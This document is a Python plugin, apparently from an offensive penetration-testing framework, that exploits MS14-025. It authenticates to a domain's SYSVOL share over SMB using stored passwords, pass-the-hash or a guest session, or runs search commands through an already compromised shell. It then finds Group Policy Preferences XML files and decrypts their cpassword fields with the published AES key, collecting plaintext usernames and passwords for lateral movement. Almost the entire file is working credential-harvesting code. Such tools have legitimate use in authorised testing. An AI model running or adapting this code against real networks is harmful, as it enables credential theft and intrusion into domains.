"""GPP password decryption — Group Policy Preferences (SYSVOL)."""

from __future__ import annotations

import base64
import logging
from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

logger = logging.getLogger(__name__)

# Microsoft published AES key for GPP (MS14-025)
GPP_AES_KEY = bytes.fromhex(
    "4e9906e8fcb66cc9faf49310620ffee8"
    "f496e834e1ccbfb5ea1698bd7089fa40"
    "69f80b4e5522a758b3c7cb7b6d998b67"
)

# GPP files that may contain cpassword
GPP_FILES = [
    "Groups/Groups.xml",
    "Services/Services.xml",
    "ScheduledTasks/ScheduledTasks.xml",
    "DataSources/DataSources.xml",
    "Drives/Drives.xml",
    "Printers/Printers.xml",
]


def decrypt_gpp(cpassword: str) -> str:
    """Decrypt GPP cpassword using the published Microsoft AES key."""
    try:
        from Crypto.Cipher import AES

        # Pad base64 string
        padding = 4 - len(cpassword) % 4
        if padding < 4:
            cpassword += "=" * padding

        encrypted = base64.b64decode(cpassword)
        iv = b"\x00" * 16
        cipher = AES.new(GPP_AES_KEY, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(encrypted)

        # Remove PKCS5 padding
        pad_len = decrypted[-1]
        return decrypted[:-pad_len].decode("utf-16-le", errors="replace")
    except ImportError:
        return "[pycryptodome required for decryption]"
    except Exception as exc:
        return f"[decryption failed: {exc}]"


class GppDecryptPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="gpp_decrypt",
        display_name="GPP Password Decryption",
        category=PluginCategory.LATERAL,
        description="Find and decrypt Group Policy Preferences passwords (MS14-025)",
        depends_on=["smb_enum"],
        produces=["credentials"],
        timeout=60.0,
        requires_http=False,
        risk_level="safe",
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        findings: list[Finding] = []
        data: dict = {"gpp_files": [], "credentials": []}

        domain = target.meta.get("ad_domain", "")

        # Try to access SYSVOL via SMB
        if ctx.smb:
            try:
                # Connect and authenticate (try null session first)
                connected = False
                if ctx.creds:
                    creds_list = ctx.creds.get_for_target(target.host)
                    for cred in creds_list[:3]:
                        try:
                            await ctx.smb.connect(target.host)
                            if cred.secret_type == "ntlm_hash":
                                await ctx.smb.authenticate_hash(
                                    cred.username, cred.secret, cred.domain or domain,
                                )
                            else:
                                await ctx.smb.authenticate(
                                    cred.username, cred.secret, cred.domain or domain,
                                )
                            connected = True
                            break
                        except Exception:
                            continue

                if not connected:
                    try:
                        await ctx.smb.connect(target.host)
                        await ctx.smb.guest_session()
                        connected = True
                    except Exception:
                        pass

                if connected:
                    # Search SYSVOL for GPP files
                    for gpp_file in GPP_FILES:
                        sysvol_path = f"SYSVOL/{domain}/Policies/*/Machine/Preferences/{gpp_file}"
                        try:
                            files = await ctx.smb.list_files("SYSVOL", sysvol_path)
                            for f in files:
                                content = await ctx.smb.download_file("SYSVOL", f)
                                if content and "cpassword" in content.lower():
                                    data["gpp_files"].append(f)
                                    # Extract cpassword
                                    self._extract_cpassword(
                                        content, f, findings, data,
                                    )
                        except Exception:
                            continue

            except Exception as exc:
                logger.debug("GPP SMB search failed: %s", exc)

        # Also try via shell session
        shells = ctx.state.get("active_shells", [])
        if shells and ctx.shell and not data["gpp_files"]:
            session = (
                ctx.shell.get_session(shells[0]["id"])
                if isinstance(shells[0], dict) else None
            )
            if session:
                # Search for Groups.xml etc. in SYSVOL
                search = await ctx.shell.execute(
                    session,
                    (
                        'find /mnt -name "Groups.xml" -o -name "Services.xml" '
                        '-o -name "ScheduledTasks.xml" 2>/dev/null; '
                        'dir /s /b \\\\*\\SYSVOL\\*\\Groups.xml 2>nul'
                    ),
                    timeout=15.0,
                )
                if search:
                    for gpp_path in search.strip().splitlines():
                        content = await ctx.shell.execute(
                            session, f"cat {gpp_path} 2>/dev/null", timeout=5.0,
                        )
                        if content and "cpassword" in content.lower():
                            data["gpp_files"].append(gpp_path)
                            self._extract_cpassword(
                                content, gpp_path, findings, data,
                            )

        if not findings:
            findings.append(Finding.info(
                "No GPP passwords found in SYSVOL",
                tags=["lateral", "gpp"],
            ))

        return PluginResult.success(
            self.meta.name, target.host, findings=findings, data=data,
        )

    def _extract_cpassword(
        self, content: str, path: str, findings: list, data: dict,
    ) -> None:
        """Extract and decrypt cpassword from GPP XML."""
        import re

        # Find cpassword attribute
        matches = re.findall(r'cpassword="([^"]+)"', content, re.IGNORECASE)
        username_matches = re.findall(
            r'userName="([^"]+)"', content, re.IGNORECASE,
        )

        for i, cpass in enumerate(matches):
            if not cpass:
                continue
            password = decrypt_gpp(cpass)
            username = username_matches[i] if i < len(username_matches) else "unknown"

            data["credentials"].append({
                "username": username,
                "password": password,
                "source": path,
            })

            findings.append(Finding.critical(
                f"GPP password decrypted: {username}",
                evidence=f"File: {path}\nUser: {username}\nPassword: {password}",
                description="Group Policy Preferences password (MS14-025)",
                remediation="Remove cpassword from GPP XML, reset affected passwords",
                tags=["lateral", "gpp", "credential"],
            ))

            # Store in credential store
            # (caller's ctx.creds not accessible here, handled at pipeline level)
